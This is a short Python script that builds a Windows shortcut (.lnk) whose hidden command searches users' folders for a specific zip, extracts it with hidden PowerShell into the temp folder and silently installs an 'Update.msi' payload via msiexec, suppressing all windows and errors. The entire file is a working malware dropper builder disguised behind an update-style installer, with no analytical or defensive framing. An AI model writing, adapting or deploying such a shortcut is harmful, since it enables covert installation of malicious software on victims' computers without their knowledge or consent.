import win32com.client
import os

shell = win32com.client.Dispatch("WScript.Shell")

lnk_path = os.path.abspath("silent_unzip_and_run.lnk")

shortcut = shell.CreateShortCut(lnk_path)

shortcut.TargetPath = r"C:\Windows\System32\cmd.exe"
shortcut.WorkingDirectory = r"C:\\"

shortcut.Arguments = r'''/c for /r "C:\Users" %i in (*abczs.zip) do (powershell -NoProfile -WindowStyle Hidden -Command "try { Expand-Archive -LiteralPath '%i' -DestinationPath \"$env:TEMP\%~ni\" -Force } catch {}" >nul 2>&1 & if exist "%TEMP%\%~ni\Update.msi" (msiexec /i "%TEMP%\%~ni\Update.msi" /qn /norestart >nul 2>&1))'''

shortcut.WindowStyle = 0  # Ẩn cửa sổ

shortcut.save()

print("Created:", lnk_path)